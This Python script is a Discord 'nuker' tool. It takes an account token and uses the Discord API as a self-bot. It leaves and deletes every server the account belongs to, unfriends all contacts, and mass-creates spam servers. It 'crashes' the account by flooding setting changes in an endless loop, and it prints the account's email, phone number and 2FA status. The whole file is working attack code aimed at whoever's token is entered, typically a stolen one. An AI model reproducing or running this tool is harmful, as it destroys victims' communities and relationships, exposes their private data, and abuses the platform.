### vicious#1337

import discord
import asyncio
import codecs
import sys
import io
import random
import threading
import requests
import discord
import os
from discord.ext import commands
from discord.ext.commands import Bot

import pyfiglet
from pyfiglet import Figlet

from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle

init(convert=True)
clear = lambda: os.system('clear')
clear()

bot = commands.Bot(command_prefix='-', self_bot=True)
bot.remove_command("help")

custom_fig = Figlet(font='graffiti')
print(custom_fig.renderText('vicious nuker'))

print('\n')
token = input("Token: ")

head = {'Authorization': str(token)}
src = requests.get('https://discordapp.com/api/v6/users/@me', headers=head)

if src.status_code == 200:
    print(f'[{Fore.GREEN}+{Fore.RESET}] Valid token')
    input("Press any key to continue...")
else:
    print(f'[{Fore.RED}-{Fore.RESET}] Invalid token')
    input("Press any key to exit...")
    exit(0)



print('\n')
print('[1] Nuke')
print('[2] Leave + Delete Servers')
print('[3] Mass Server')
print('[4] Unfriend Everytone')
print('[5] Crash Token')
print('[6] Token Info')
print('\n')

#### Nuke
def nuke():
    print("Loading...")
    print('\n')
    
    @bot.event
    async def on_ready(times : int=100):
        
        print('Status : [Nuke]')
        print('\n')
        print('Status : [Leaving Servers]')
        print('\n')

        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f'Left [{guild.name}]')
            except:
                print(f'Cant leave [{guild.name}]')
        print('\n')
        print('Status : [Deleting Servers]')
        print('\n')
        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f'[{guild.name}] have been deleted')
            except:
                print(f'Cant delete [{guild.name}]')
        
        print('\n')
        print('Status : [Unfriend Everyone]')
        print('\n')

        for user in bot.user.friends:
            try:
                await user.remove_friend()
                print(f'Unfriend {user}')
            except:
                print(f"Can't Unfriend {user}")
        
        print('\n')
        print('Status : [Mass Server]')
        print('\n')

        for i in range(times):
            await bot.create_guild('vicious#1337', region=None, icon=None)
            print(f'Created {i} server')
        print('\n')
        print('Max server limit is 100')
        print('\n')
        print('\n')
        print('Status : [Crash Token]')       
        print('\n')

        print('\n')
        print('Crasing token...')
        headers = {'Authorization': token}
        modes = cycle(["light", "dark"])
        while True:
            setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
            requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)


    bot.run(token, bot=False)


#### Unfriend Everyone
def unfriender():
    print("Loading...")
    #bot.logout
    
    @bot.event
    async def on_ready():
        print('Status : [Unfriend Everyone]')
    
        for user in bot.user.friends:
            try:
                await user.remove_friend()
                print(f'Unfriended {user}')
            except:
                print(f"Can't Unfriend {user}")
        
        print('\n')
        print('[Restart the tool if you want to use it again]')
        print('\n')
    bot.run(token, bot=False)

#### Server Leaver
def leaver():
    print("Loading...")
    #bot.logout
    
    @bot.event
    async def on_ready():
        print('Status : [Leave + Delete Servers]')

        for guild in bot.guilds:
            try:
                await guild.leave()
                print(f'Left [{guild.name}]')
            except:
                print(f'Cant leave, but will be deleted [{guild.name}]')

        for guild in bot.guilds:
            try:
                await guild.delete()
                print(f'[{guild.name}] have been deleted')
            except:
                print(f'Cant delete [{guild.name}]')    

        print('\n')
        print('[Restart the tool if you want to use it again]')
        print('\n')

    bot.run(token, bot=False)
    

#### Mass Server
def spamservers():
    print("Loading...")
    
    @bot.event
    async def on_ready(times: int=95):
        print('4 : [Mass Server]')
        
        for i in range(times):
            await bot.create_guild('vicious#1337', region=None, icon=None)
            print(f'Created {i} server')
    
        print('Max server limit is 100')
        print('\n')
        print('[Restart the tool if you want to use it again]')
        print('\n')
        input()
    bot.run(token, bot=False)

def tokenInfo(token):
    print('Status : [Token Info]')
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            mfa = r.json()['mfa_enabled']
            print(f'''
            [{Fore.RED}Token{Fore.RESET}]           {token}
            [{Fore.RED}Username{Fore.RESET}]       {userName}
            [{Fore.RED}User ID{Fore.RESET}]         {userID}
            [{Fore.RED}Email{Fore.RESET}]           {email}
            [{Fore.RED}Phone Number{Fore.RESET}]    {phone if phone else ""}
            [{Fore.RED}2 Factor{Fore.RESET}]        {mfa}
            ''')
            input()

def crashdiscord(token):
    print('Status : [Crash Token]')
    print('\n')
    print('Crashing token...')
    headers = {'Authorization': token}
    modes = cycle(["light", "dark"])
    while True:
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)


def mainanswer():
    answer = input('Choose : ')
    if answer == '1':
        nuke()
    elif answer == '2':
        leaver()
    elif answer == '3':
        spamservers()
    elif answer == '4':
        unfriender()
    elif answer == '5':
        crashdiscord(token)
    elif answer == '6':
        tokenInfo(token)
    else:
        print('[/] Bad input, try again')
        mainanswer()

mainanswer()